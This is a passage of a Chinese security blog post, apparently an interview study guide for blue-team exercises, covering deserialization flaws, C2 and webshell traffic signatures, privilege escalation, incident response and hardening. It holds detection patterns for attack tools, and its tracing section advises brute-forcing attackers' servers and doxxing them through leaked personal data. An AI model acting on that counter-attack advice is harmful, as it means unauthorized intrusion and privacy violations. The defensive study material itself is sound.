+<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/SaoEAe5jB7vE5uoY2YOKbg">DNSLog的综合利用 (qq.com)</a></p>
+<h2 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h2><h3 id="weblogic漏洞"><a href="#weblogic漏洞" class="headerlink" title="weblogic漏洞"></a>weblogic漏洞</h3><p>在weblogic里面其实反序列化漏洞利用中大致分为两种，一个是基于T3协议的反序列化漏洞，一个是基于XML的反序列化漏洞。</p>
+<p>1.直接通过<strong>T3协议</strong>发送恶意反序列化对象(CVE-2015-4582、CVE-2016-0638、CVE-2016-3510、CVE-2020-2555、CVE-2020-2883)<br>2.利用<strong>T3协议</strong>配合<strong>RMP</strong>或<strong>ND接口</strong>反向发送反序列化数据(CVE2017-3248、CVE2018-2628、CVE2018-2893、CVE2018-3245、CVE-2018-3191、CVE-2020-14644、CVE-2020-14645)还有利用<strong>IIOP协议</strong>的CVE-2020-2551<br>3.通过 javabean <strong>XML</strong>方式发送反序列化数据。(CVE2017-3506-&gt;CVE-2017-10271-&gt;CVE2019-2725-&gt;CVE-2019-2729)</p>
+<p><strong>xml：</strong>是因为<strong>xmldecode</strong>解析导致的反序列化，他的包就是一个很大的xml格式内容</p>
+<h3 id="fastjson反序列化"><a href="#fastjson反序列化" class="headerlink" title="fastjson反序列化"></a>fastjson反序列化</h3><p>请求包里发送恶意js格式的payload，在处理json对象的时候没有过滤@type字段，从而使fastjson通过字段传入一个类，在执行时进而实行构造恶意函数。</p>
+<h3 id="shiro反序列化漏洞"><a href="#shiro反序列化漏洞" class="headerlink" title="shiro反序列化漏洞"></a>shiro反序列化漏洞</h3><p><strong>shiro550：</strong></p>
+<p><strong>关键词：RememberMe</strong></p>
+<p>存在一个忘记密码功能，用户信息会进行加密，而这一个过程中密钥出现了问题，使用密钥进行碰撞并且不需要cookie，从而构造反序列化rce，进而攻击。</p>
+<p><strong>shiro721:</strong></p>
+<p>shiro721利用的前提就是存在cookie，构造cookie值进行rce。</p>
+<h3 id="log4j漏洞-1"><a href="#log4j漏洞-1" class="headerlink" title="log4j漏洞"></a>log4j漏洞</h3><p>Log4j2 组件在处理程序日志记录时存在JNDI 注入缺陷，未经授权的攻击者利用该漏洞，可向目标服务器发送精心构造的恶意数据，触发Log4j2 组件解析缺陷，实现目标服务器的任意代码执行，获得目标服务器权限。</p>
+<p><strong>特征：</strong>${xxxxxx}</p>
+<h2 id="流量特征"><a href="#流量特征" class="headerlink" title="流量特征"></a>流量特征</h2><h3 id="cs流量特征："><a href="#cs流量特征：" class="headerlink" title="cs流量特征："></a><strong>cs流量特征：</strong></h3><p>对比正常的http流量，CS的http通信流量具有以下几个特征： </p>
+<p>A. <strong>心跳包特征</strong> </p>
+<p>a) 间隔一定时间，均有通信，且流级上的上下行数据长度固定； </p>
+<p>B. <strong>域名&#x2F;IP特征</strong> </p>
+<p>a) 未走CDN、域前置的，域名及IP暴露</p>
+<p>b) 走CDN、域前置的，真实IP会被隐藏； </p>
+<p>C. <strong>指令特征</strong> </p>
+<p>a) 下发指令时，通过心跳包接收指令，这时，server端返回的包更长，甚至包含要加载的dll模块数据。 </p>
+<p>b) 指令执行完后，client端通过POST请求发送执行的结果数据，body部分通过加密和base64编码。 </p>
+<p>c) 不同指令，执行的时间间隔不一样，可以通过POST请求和GET请求的间隔进行判断。 </p>
+<p>D. <strong>数据特征</strong> </p>
+<p>a) 在请求的返回包中，通信数据均隐藏在jqeury*.js中。</p>
+<h3 id="MSF流量特征："><a href="#MSF流量特征：" class="headerlink" title="MSF流量特征："></a><strong>MSF流量特征：</strong></h3><p>1，端口号：msf默认使用4444端口作为反向连接端口</p>
+<p>2，数据内容：msf数据包通常包含特定字符串:(“meterpreter”、”revshell”等)</p>
+<h3 id="冰蝎流量特征"><a href="#冰蝎流量特征" class="headerlink" title="冰蝎流量特征:"></a><strong>冰蝎流量特征:</strong></h3><p><strong>冰蝎2.0和3.0区别：</strong></p>
+<p><strong>1，加密方式不同，一个是RC4加密，一个AES加密。</strong></p>
+<p><strong>2，编写语言不同，2.0采用的是c++，3.0采用的是java。</strong></p>
+<p><strong>3，冰蝎流量检测，无论是get请求还是post请求，</strong>content-type都为<strong>application&#x2F;octet-stream</strong>。</p>
+<p>冰蝎4.0流量分析：1，十种ua头，可关键字拦截ua头进行匹配拦截。</p>
+<p>2，流量特征，Content-type: Application&#x2F;x-www-form-urlencoded。</p>
+<p>3，accept字段：Accept:application&#x2F;json, text&#x2F;javascript, <em>&#x2F;</em>; q&#x3D;0.01</p>
+<p>（4.0我也不太明白，自己网上多查查资料吧）</p>
+<h3 id="哥斯拉流量特征"><a href="#哥斯拉流量特征" class="headerlink" title="哥斯拉流量特征:"></a><strong>哥斯拉流量特征:</strong></h3><p>1，强特征：cookie字段，最后一个Cookie的值出现  “**;**”（尾值出现分号）</p>
+<p>2，paylod特征：jsp会出现xc,pass字符和Java反射，base64加解码等特征，php，asp则为普通的一句话木马。</p>
+<h3 id="菜刀流量特征："><a href="#菜刀流量特征：" class="headerlink" title="菜刀流量特征："></a><strong>菜刀流量特征：</strong></h3><p>1，请求包中：ua头为百度，火狐</p>
+<p>2，请求体中存在eavl，base64等特征字符<br>3，请求体中传递的payload为base64编码，并且存在固定的数值</p>
+<p>4.伪造X-Forwarded-For头</p>
+<h3 id="蚁剑流量分析："><a href="#蚁剑流量分析：" class="headerlink" title="蚁剑流量分析："></a><strong>蚁剑流量分析：</strong></h3><p>1，payload特征：Php中使用assert，eval执行；asp 使用eval；在jsp使用的是Java类加载（ClassLoader），同时会带有base64编码解码等字符特征。</p>
+<p>2，流量特征：每个请求体都在：@ini_set(“diplay_erors”,“0”);@set_time_limit(0)开头。并且后面存在base64等字符</p>
+<h2 id="常见的中间件漏洞"><a href="#常见的中间件漏洞" class="headerlink" title="常见的中间件漏洞"></a>常见的中间件漏洞</h2><h3 id="IIS"><a href="#IIS" class="headerlink" title="IIS"></a>IIS</h3><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token constant">PUT</span>漏洞、短文件名猜解、远程代码执行、解析漏洞<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h3 id="Apache"><a href="#Apache" class="headerlink" title="Apache"></a>Apache</h3><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">解析漏洞、目录遍历<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h3 id="Nginx"><a href="#Nginx" class="headerlink" title="Nginx"></a>Nginx</h3><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">文件解析、目录遍历、<span class="token constant">CRLF</span>注入、目录穿越<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h3 id="Tomcat"><a href="#Tomcat" class="headerlink" title="Tomcat"></a>Tomcat</h3><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">远程代码执行、war后门文件部署<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h3 id="JBoss"><a href="#JBoss" class="headerlink" title="JBoss"></a>JBoss</h3><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">反序列化漏洞、war后门文件部署<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h3 id="WebLogic"><a href="#WebLogic" class="headerlink" title="WebLogic"></a>WebLogic</h3><pre class="line-numbers language-none"><code class="language-none">反序列化漏洞
+SSRF任意文件上传
+war后门文件部署<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+
+
+<h2 id="内存马查找"><a href="#内存马查找" class="headerlink" title="内存马查找"></a>内存马查找</h2><p><strong>windows：</strong>看看dll文件，注册表，查看外联可以的vps的地址。</p>
+<p>**linux:**使用命令进行遍历。</p>
+<h2 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h2><h3 id="确定目标"><a href="#确定目标" class="headerlink" title="确定目标"></a>确定目标</h3><p>在拿到一个url时，先确定自己的渗透目标，是要测试整个网站还是某个模块。自己要干什么首先要想清楚。</p>
+<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>此阶段是渗透测试中最基础也是最关键的一步，信息收集的多少一定程度上决定是否能够渗透成功。信息收集过程中可以借助<strong>搜索引擎</strong>（fofa，钟馗之眼）获得一些重要信息。比如后台，敏感的url等。</p>
+<p>通过域名找到IP，子域名，旁站，是否存在CDN。<strong>（站长工具）</strong></p>
+<p>探测网站相关版本信息，如果网站用了cms，那就查找cms指纹，查找该cms是否存在漏洞。</p>
+<p><strong>旁站</strong>：与本网站公用一个服务器。</p>
+<p><strong>C段（护网中较有意义）</strong>：C段指的是同一内网段内的其他服务器。</p>
+<p>等等。</p>
+<h3 id="漏洞扫描"><a href="#漏洞扫描" class="headerlink" title="漏洞扫描"></a>漏洞扫描</h3><p>对网站进行漏洞探测，可以使用相关工具（不问不说：AWVS,Appscan,Nessuss）。扫描到漏洞的话进行漏洞验证利用。</p>
+<p>顺利的话最终拿到webshell。</p>
+<p>测试结束后总结整个流程，给相关机构提出修复建议。</p>
+<h3 id="拿到网站登录框该怎么下手"><a href="#拿到网站登录框该怎么下手" class="headerlink" title="拿到网站登录框该怎么下手"></a>拿到网站登录框该怎么下手</h3><p>首先分析登录框的参数。</p>
+<p>尝试弱口令登录，能够进行爆破的话进行爆破。</p>
+<p>SQL注入在登陆框也容易出现，如果存在sql注入漏洞的话那就进行攻击。</p>
+<h2 id="溯源的思路"><a href="#溯源的思路" class="headerlink" title="溯源的思路"></a>溯源的思路</h2><p>1.红队攻击都会挂着代理，你溯源的话只能溯源到他的代理ip，没有太大的意义，如果说服务器被上了内存马的情况，可以去工具取样他内存马的ip，对内存马ip反向扫描端口，<br>因为他们也是通过远程进去的，去爆破他们的ssh,3389和cs的密码。<br>1.反序列化的取样，他打shiro，里面就有他的基本设备vps，通过中间件吧这些有特征的ip收集，放到在线情报平台上识别，检测是不是有ip绑定域名的，通过whois反查他的域名注册时间、邮箱，通过社工库查他的手机号，然后通过社交软件，qq、微信、支付宝来给他转一毛钱，拼接他的个人信息。</p>
+<p>4.已经被上传webshell应急<br>2.系统如果已经被植入后门，说明攻击者已经攻击成功，而且拿到权限，这时候日志信息可能提供不了帮助，首先要去考虑系统的账户是否安全，，又没口令爆破成功的痕迹，排查账号的密码是否已经不安全.<br>(Linux)的话看计划任务,有没有定时反弹shell,还有就是进程是不是可疑在通信.发现可疑问题,就要样本分析.<br>(windows)的话就看启动项和进程.<br>如果是web入侵,看日志web服务是不是安全?还原攻击的流程.<br>5.流量溯源<br>1.先看日志，看攻击时间做一个审计，搜索这个时间文件上传的操作，一般是GET和POST两种，GET的话可以直接看到他请求的资源、地址和content，然后webshell该杀就杀，后门改补就补，如果是POST，那么就看不到请求的内容，可以去防火墙上下载完整数据包来分析。</p>
+<h2 id="溯源反制的思路？"><a href="#溯源反制的思路？" class="headerlink" title="溯源反制的思路？"></a><strong>溯源反制的思路？</strong></h2><p>1.攻击源捕获</p>
+<ul>
+<li>安全设备报警，如扫描IP、威胁阻断、病毒木马、入侵事件等</li>
+<li>日志与流量分析，异常的通讯流量、攻击源与攻击目标等</li>
+<li>服务器资源异常，异常的文件、账号、进程、端口，启动项、计划任务和服务等</li>
+<li>邮件钓鱼，获取恶意文件样本、钓鱼网站 URL 等</li>
+<li>蜜罐系统，获取攻击者 ID、电脑信息、浏览器指纹、行为、意图的相关信息</li>
+</ul>
+<p> 2.溯源反制</p>
+<ul>
+<li>IP 定位技术<br>根据IP定位物理地址–代理   IP<br>溯源案例：通过 IP 端口扫描，反向渗透服务器进行分析，最终定位到攻击者相关信息</li>
+<li>ID 追踪术<br>ID 追踪术，搜索引擎、社交平台、技术论坛、社工库匹配<br>溯源案例：利用 ID 从技术论坛追溯邮箱，继续通过邮箱反追踪真实姓名，通过姓名找到相关简历信息</li>
+<li>网站 url<br>域名 Whois 查询–注册人姓名、地址、电话和邮箱   –域名隐私保护<br>溯源案例：通过攻击 IP 历史解析记录&#x2F;域名，对域名注册信息进行溯源分析</li>
+<li>恶意样本分析<br>提取样本特征、用户名、ID、邮箱、C2 服务器等信息–同源分析<br>溯源案例：样本分析过程中，发现攻击者的个人 ID 和 QQ，成功定位到攻击者</li>
+<li>社交账号<br>基于 JSONP 跨域，获取攻击者的主机信息、浏览器信息、真实 IP 及社交信息等<br>利用条件：可以找到相关社交网站的 jsonp 接口泄露敏感信息，相关网站登录未注销</li>
+</ul>
+<p> 3.攻击者画像</p>
+<ul>
+<li>攻击路径</li>
+</ul>
+<p>攻击目的：拿到权限、窃取数据、获取利益、DDOS 等<br>网络代理：代理 IP、跳板机、C2 服务器等<br>攻击手法：鱼叉式邮件钓鱼、Web渗透、水坑攻击、近源渗透、社会工程等</p>
+<ul>
+<li>攻击者身份画像</li>
+</ul>
+<p>虚拟身份：ID、昵称、网名<br>真实身份：姓名、物理位置<br>联系方式：手机号、qq&#x2F;微信、邮箱<br>组织情况：单位名称、职位信息</p>
+<h2 id="研判的思路？"><a href="#研判的思路？" class="headerlink" title="研判的思路？"></a><strong>研判的思路？</strong></h2><p>1.首先对<strong>攻击的来源</strong>进行判断，是内对内，外对内还是内对外的情况。</p>
+<p>2.依据设备的告警信息结合具体情况来分析<strong>攻击行为的类型</strong>，比如说告警SQL注入攻击，那我们就去查看一下请求数据包里面是否有单引号，SELECT等敏感字符，返回数据包里面是否有SQL语法报错等信息，有的话就可以初步判断该攻击行为是SQL注入攻击。</p>
+<p>3.然后就是<strong>根据攻击特征来分析</strong>攻击行为使用了什么技术或者说工具，比如说攻击的频率，数据包的信息等等。比如说在使用AWVS或者APPSCAN等工具在扫描的时候，很有可能在请求数据包的user-agent里面就有相关的信息。同样结合告警信息和具体情况来判断攻击行为的危害程度，比如说检测到多条攻击成功告警和内对内及内对外攻击告警，这个时候就需要尽快的交给应急组了。</p>
+<p>4.结合设备告警信息及具体情况<strong>分析攻击意图</strong>，比如说攻击者的目标是主站还是旁站，是主机还是域控，不同的攻击意图对于后续的处理也不同。</p>
+<p>5.最后根据我们掌握的信息采<strong>取相应的处置</strong>方式，比如说告警信息是误报，说明设备需要策略优化，不需要处置。告警信息是尝试攻击，暂时对资产没有影响，就需要后续持续关注，攻击成功时能够做到及时上报。如果告警确认不是误报，并且攻击成功时，我们就需要迅速上报及时采取应急响应。</p>
+<h2 id="应急响应"><a href="#应急响应" class="headerlink" title="应急响应"></a>应急响应</h2><h3 id="应急响应基本流程"><a href="#应急响应基本流程" class="headerlink" title="应急响应基本流程"></a>应急响应基本流程</h3><p>1.首先应该是<strong>信息收集</strong>，比如说影响范围有多大，事件类型是什么，源头主机和攻击意图，是否需要保障业务等等信息，这一步可以帮助我们更有效的进行下一步的阻断攻击行为。</p>
+<p>2.接下来就是<strong>结合已知的信息阻断攻击行为，保护资产</strong>。比如说攻击行为局限于某个站点，且未造成较大损失，那我们可以直接封掉攻击者的IP来确保业务的正常进行，当然之后也要对这个站点有一个持续的关注。如果是某台主机沦陷或者说域控服务器沦陷，那么这就算比较重大的损失，为了避免损失扩大，应该及时将感染设备断网处理。如果有备份服务器，可以切换备用设备来保障业务正常。</p>
+<p>3.<strong>对攻击行为阻断后需要对数据进行保护</strong>，比如说保存好流量、可疑进程的内存、失陷系统镜像、恶意样本、设备的日志，这一步可以有效帮助我们后续的溯源工作。</p>
+<p>4.<strong>安全事件影响根除</strong>，工具结合手工从系统用户是否有新增用户，进程信息，计划任务，自启动项，注册表，端口状态(是否有对外连接)等方面来检查是否有可疑行为，比如说火绒剑，ProcessHacker等专门用于分析这些方面的工具。如果有就直接关闭或者删除，有一些顽固进程或者顽固文件无法关闭或者删除可以结合专杀工具处理，比如说Rkhunter,火绒等工具。</p>
+<p>5.<strong>恢复业务</strong>，加强安全措施，加固系统等，比如说更新软件版本，安装已知漏洞的补丁，关闭某些端口等等，暂时没有解决办法的可以根据业务需求关闭某些服务。<br>6.最后就是输出报告，总结反思。</p>
+<h3 id="应急响应案例"><a href="#应急响应案例" class="headerlink" title="应急响应案例"></a>应急响应案例</h3><p>我拿个之前的应急排查来说吧，就是我们这边接到通知他们公司几台服务器有问题，让我们去检测。然后看到是windows的机子，本地用户和组排查的时候发现新建可疑的用户，确定主机是有问题的，对方已经拿到主机权限,然后事件管理器有大量的登录日志爆破，采取的措施是直接删除可疑的和隐藏账号,排查登录日志,确定系统账号已经不安全,更新了管理员账号,对启动项和可疑进程做了清除,取了一份样本拿去分析,通告上级紧急修补web站点的漏洞.</p>
+<h3 id="内网隧道："><a href="#内网隧道：" class="headerlink" title="内网隧道："></a>内网隧道：</h3><p>tcp隧道：基础的 TCP 映射，适用于大多数服务，例如<strong>远程桌面、SSH</strong></p>
+<p>udp隧道：基础的 UDP 映射，适用于域名解析、部分基于 UDP 协议的<strong>游戏</strong></p>
+<p>http：搭建网站专用映射，通过 80 端口访问</p>
+<p>https：带有 SSL 加密的网站映射，通过 443 端口访问，映射目标需要支持 SSL</p>
+<h3 id="护网时对IP的判断"><a href="#护网时对IP的判断" class="headerlink" title="护网时对IP的判断"></a>护网时对IP的判断</h3><p>如果该IP在护网期间频繁出现，而护网之前基本上未出现过，那么改IP很有可能是红队IP。即封锁该IP。</p>
+<p>护网中封锁红队IP的方法有以下几种：</p>
+<ol>
+<li><p>使用防火墙（<strong>WAF</strong>）：防火墙可以设置规则，将红队IP加入黑名单，从而禁止它们访问受保护的网络或系统。</p>
+</li>
+<li><p>使用入侵检测系统（<strong>IDS</strong>）：入侵检测系统可以监测网络流量和系统行为，当检测到红队IP的攻击行为时，可以自动将其加入黑名单或者阻止其访问。</p>
+</li>
+<li><p>使用反向代理（常见的有CF）：在反向代理服务器上设置规则，当检测到红队IP的攻击行为时，可以将其请求重定向到一个错误页面或者进行拦截。</p>
+</li>
+<li><h5 id="使用IP过滤器：可以使用专门的IP过滤器，将红队IP加入黑名单中，从而禁止其访问受保护的网络或系统。"><a href="#使用IP过滤器：可以使用专门的IP过滤器，将红队IP加入黑名单中，从而禁止其访问受保护的网络或系统。" class="headerlink" title="使用IP过滤器：可以使用专门的IP过滤器，将红队IP加入黑名单中，从而禁止其访问受保护的网络或系统。"></a>使用IP过滤器：可以使用专门的IP过滤器，将红队IP加入黑名单中，从而禁止其访问受保护的网络或系统。</h5></li>
+</ol>
+<h2 id="敏感事件id"><a href="#敏感事件id" class="headerlink" title="敏感事件id:"></a>敏感事件id:</h2><p>4624 登录成功<br>4625 登录失败<br>4634 注销成功<br>4647 用户启动的注销<br>4672 使用超级用户&#x2F;管理员用户进行登录<br>4720 创建用户</p>
+<h2 id="挖矿病毒"><a href="#挖矿病毒" class="headerlink" title="挖矿病毒"></a>挖矿病毒</h2><p>挖矿病毒：消耗用户CPU、GPU资源，进行大量运算，获取加密货币的病毒。</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/96df0c3d9adc28f32537fa7df52fe736.jpg" alt="1"></p>
+<p>攻击者通过各种手段将挖矿程序植入受害者的计算机中，在受害者不知情的情况下利用其计算机的云算力进行挖矿，从而获取利益，这类非法植入用户计算机的挖矿程序就是挖矿木马。</p>
+<h2 id="蠕虫感染"><a href="#蠕虫感染" class="headerlink" title="蠕虫感染"></a>蠕虫感染</h2><h3 id="结构"><a href="#结构" class="headerlink" title="结构"></a>结构</h3><p>蠕虫病毒的程序结构通常包括三个模块： [3] </p>
+<p>(1)传播模块：负责蠕虫的传播，它可以分为扫描模块、攻击模块和复制模块三个子模块。其中，扫描模块负责探测存在漏洞的主机；攻击模块按漏洞攻击步骤自动攻击找到的对象；复制模块通过原主机和新主机交互将蠕虫程序复制到新主机并启动。 [3] </p>
+<p>(2)隐藏模块：侵入主机后，负责隐藏蠕虫程序。 [3] </p>
+<p>(3)目的功能模块：实现对计算机的控制、监视或破坏等。 [3] </p>
+<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>根据蠕虫病毒的程序其工作流程可以分为漏洞扫描、攻击、传染、现场处理四个阶段，首先蠕虫程序随机(或在某种倾向性策略下)选取某一段IP地址，接着对这一地址段的主机扫描，当扫描到有漏洞的计算机系统后，将蠕虫主体迁移到目标主机。然后，蠕虫程序进入被感染的系统，对目标主机进行现场处理。同时，蠕虫程序生成多个副本，重复上述流程。各个步骤的繁简程度也不同，有的十分复杂，有的则非常简单。</p>
+<h2 id="勒索病毒"><a href="#勒索病毒" class="headerlink" title="勒索病毒"></a>勒索病毒</h2><p>勒索病毒：能对用户文件进行加密的病毒。</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/dba35b1c085dc28b692e4d0f9770e8ed.jpg" alt="lesuo"></p>
+<h2 id="宏病毒"><a href="#宏病毒" class="headerlink" title="宏病毒"></a>宏病毒</h2><p>宏是微软公司为其Office软件包设计的一个特殊功能，由于其功能强大，使得黑客可以通过精心构造的宏代码来实现恶意操作，这些代码就叫做宏病毒。宏病毒常以垃圾邮件的方式对用户进行攻击，因为伪造的Office文档不容易引起用户的怀疑，所以当用户毫无防备的打开Office文档并启用宏之后，宏病毒便开始了运行，对用户主机进行恶意操作。</p>
+<h2 id="内网黄金票据原理"><a href="#内网黄金票据原理" class="headerlink" title="内网黄金票据原理"></a>内网黄金票据原理</h2><p>在Kerberos认证中,Client通过AS(身份认证服务)认证后,AS会给Client一个<br>Logon Session Key和TGT,而Logon Session Key并不会保存在KDC中，krbtgt的NTLM Hash又是固定的,所以只要得到krbtgt的NTLM Hash，就可以伪造TGT和Logon Session Key来进入下一步Client与TGS的交互。而已有了金票后,就跳过AS验证,不用验证账户和密码,所以也不担心域管密码修改。</p>
+<h2 id="黄金票据和白银票据的区别？"><a href="#黄金票据和白银票据的区别？" class="headerlink" title="黄金票据和白银票据的区别？"></a>黄金票据和白银票据的区别？</h2><p><strong>获取的权限不同</strong><br>金票:伪造的TGT，可以获取任意Kerberos的访问权限</p>
+<p>银票:伪造的ST，只能访问指定的服务，如CIFS<br><strong>认证流程不同</strong><br>金票: 同KDC交互，但不同AS交互<br>银票:不同KDC交互，直接访问Server<br><strong>加密方式不同</strong><br>金票: 由krbtgt NTLM Hash 加密<br>银票: 由服务账号 NTLM Hash 加密</p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><h3 id="linux提权"><a href="#linux提权" class="headerlink" title="linux提权"></a>linux提权</h3><p>1.通过 su 命令暴破 root 密码</p>
+<p>2.内核漏洞提权</p>
+<p>3.SUID提权：SUID可以让程序调用者以文件拥有者的身份运行该文件，当我们以一个普通用户去运行一个root用户所有的SUID文件，那么运行该文件我们就可以获取到root权限</p>
+<p>4.find：find实用程序find可用于发现存储在系统上。然而，它是执行命令的能力。因此，如果它被配置为使用 SUID 权限运行，那么所有将通过 find 执行的命令都将以 root 身份执行。</p>
+<h3 id="window提权"><a href="#window提权" class="headerlink" title="window提权"></a>window提权</h3><p><strong>1、系统内核溢出漏洞提权</strong></p>
+<p><strong>#手工查找补丁情况</strong></p>
+<pre class="line-numbers language-text" data-language="text"><code class="language-text">systeminfo  #查看补丁
+wmic qfe get Description,HotFixID,InstalledOn  #查看补丁信息<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p><strong>#MSF后渗透扫描</strong></p>
+<pre class="line-numbers language-text" data-language="text"><code class="language-text">post/windows/gather/enum_patches<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><strong>2、at命令利用</strong></p>
+<p><strong>在Windows2000、Windows 2003、Windows XP 这三类系统中，我们可以使用at命令将权限提升至system权限。</strong></p>
+<p><strong>3.数据库提权</strong></p>
+<pre class="line-numbers language-none"><code class="language-none">udf提权：通过创建用户自定义函数，对mysql功能进行扩充，可以执行系统任意命令，将mysql账号root转化为系统system权限。
+mof提权：在windows平台下，c:&#x2F;windows&#x2F;system32&#x2F;wbem&#x2F;mof&#x2F;nullevt.mof 这个文件会每间隔一段时间（很短暂）就会以system权限执行一次，所以，只要我们将我们先要做的事通过代码存储到这个mof文件中，就可以实现权限提升。
+启动项提权：将后面脚本上传到系统启动目录，当服务器重启就会自动执行该脚本，从而获取系统权限。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p><strong>4.MS14-068 域用户提权漏洞</strong></p>
+<p>服务票据是客户端直接发送给服务器,并请求服务资源的。如果服务器没有向<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E5%9F%9F%E6%8E%A7&spm=1001.2101.3001.7020">域控</a>dc验证pac的话,那么客户端可以伪造域管的权限来访问服务器。</p>
+<h2 id="主机加固"><a href="#主机加固" class="headerlink" title="主机加固"></a>主机加固</h2><h3 id="Linux加固"><a href="#Linux加固" class="headerlink" title="Linux加固"></a>Linux加固</h3><p>**1.**修改ssh的配置文件，禁止root直接登录</p>
+<p>**2.**修改密码策略配置文件，确保密码最小长度为8位</p>
+<p>**3.**确保错误登录3次，锁定此账户5分钟</p>
+<p>**4.**禁止su非法提权，只允许root和wheel组用户su到root</p>
+<p>**5.**不响应ICMP请求</p>
+<p>**6.**设置登陆超时时间为10分钟</p>
+<p><strong>7.</strong> 结束非法登录用户</p>
+<h3 id="Windows加固"><a href="#Windows加固" class="headerlink" title="Windows加固"></a><strong>Windows加固</strong></h3><p><strong>1.</strong>  <strong>修改3389端口</strong></p>
+<p><strong>2.</strong>  设置安全策略，不允许<strong>SAM</strong>帐户的匿名枚举，不允许SAM帐户和共享的匿名枚举</p>
+<p><strong>3.<strong>在组策略中设置</strong>阻止访问注册表编辑工具</strong></p>
+<p><strong>4.</strong>  <strong>开启审核对象访问，成功与失败；开启审核目录服务访问，成功与失败；开启审核系统事件，成功与失败</strong></p>
+<p><strong>5.</strong>  <strong>禁止445端口漏洞</strong></p>
+<p><strong>6.</strong>  <strong>设置屏幕保护在恢复时使用密码保护</strong></p>
+<p><strong>7.</strong>  <strong>设置windows密码策略</strong>：使密码必须满足复杂性，设置密码长度最小值为8位，设置密码最长存留期为30天</p>
+<p><strong>8.</strong>  开启Windows防火墙，<strong>关闭ping服务</strong>，打开3389、80等服务</p>
+<p><strong>9.</strong>  <strong>关闭系统默认共享</strong></p>
+<h2 id="日志分析"><a href="#日志分析" class="headerlink" title="日志分析"></a>日志分析</h2><h3 id="1-系统日志"><a href="#1-系统日志" class="headerlink" title="1.系统日志"></a>1.系统日志</h3><p>分析方法：</p>
+<p>a、前提：开启审核策略，若日后系统出现故障、安全事故则可以查看系统的日志文件，排除故障，追查入侵者的信息等。</p>
+<p>b、Win+R打开运行，输入<code>eventvwr.msc</code>，回车运行，打开事件查看器。</p>
+<p>c、导出应用程序日志、安全日志、系统日志，利用Log Parser进行分析。</p>
+<h3 id="2-web访问日志"><a href="#2-web访问日志" class="headerlink" title="2.web访问日志"></a>2.web访问日志</h3><p>分析方法：</p>
+<p>a、找到中间件的web日志，打包到本地方便进行分析。</p>
+<p>b、推荐工具：</p>
+<ul>
+<li>Windows下，推荐使用EmEditor进行日志分析，支持大文本，搜索效率不错。</li>
+<li>Linux下，使用Shell命名组合查询分析。</li>
+</ul>
+<h2 id="正向shell和反向shell"><a href="#正向shell和反向shell" class="headerlink" title="正向shell和反向shell"></a><strong>正向shell和反向shell</strong></h2><p> 正向shell：控制端主动发起连接去连接被控制端<br> 反向shell：被控制端主动连接控制端</p>
+<h2 id="防火墙中的DMZ区域，Trust区域，Untrust区域"><a href="#防火墙中的DMZ区域，Trust区域，Untrust区域" class="headerlink" title="防火墙中的DMZ区域，Trust区域，Untrust区域"></a>防火墙中的DMZ区域，Trust区域，Untrust区域</h2><h3 id="DMZ区域（非军事化区）"><a href="#DMZ区域（非军事化区）" class="headerlink" title="DMZ区域（非军事化区）"></a>DMZ区域（非军事化区）</h3><p> 1.两个防火墙之间的空间被称为DMZ。与Internet相比，DMZ可以提供更高的安全性，但是其安全性比内部网络低。<br> 2.服务器 内 外网都可以访问,但还是与内网隔离.<br> 就算是黑客把DMZ服务器拿下,也不能使用服务器来控制内网的网络.起到安全的策略<br>Trust区域，</p>
+<h3 id="Trust区域（受信区）"><a href="#Trust区域（受信区）" class="headerlink" title="Trust区域（受信区）"></a>Trust区域（受信区）</h3><p> 可信任的接口.是局域网的接口.此接口外网和DMZ无法访问.<br> 外部不能访问trust口<br> DMZ不能访问trust口</p>
+<h3 id="Untrust区域（非受信区）"><a href="#Untrust区域（非受信区）" class="headerlink" title="Untrust区域（非受信区）"></a>Untrust区域（非受信区）</h3><p> 不信任的接口,是用来接internet的,这个接口的信息内网不接受<br> 可以通过untrust口访问DMZ,但不能访问trust口**</p>
+
+                
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        文章作者:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="/about" rel="external nofollow noreferrer">n0rt6</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        文章链接:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="http://3143047748.github.io/2023/06/20/hvv%E5%88%9D%E7%BA%A7%E9%9D%A2%E8%AF%95%E6%80%BB%E7%BB%93/">http://3143047748.github.io/2023/06/20/hvv%E5%88%9D%E7%BA%A7%E9%9D%A2%E8%AF%95%E6%80%BB%E7%BB%93/</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        版权声明:
+                    </i>
+                </span>
+                <span class="reprint-info">
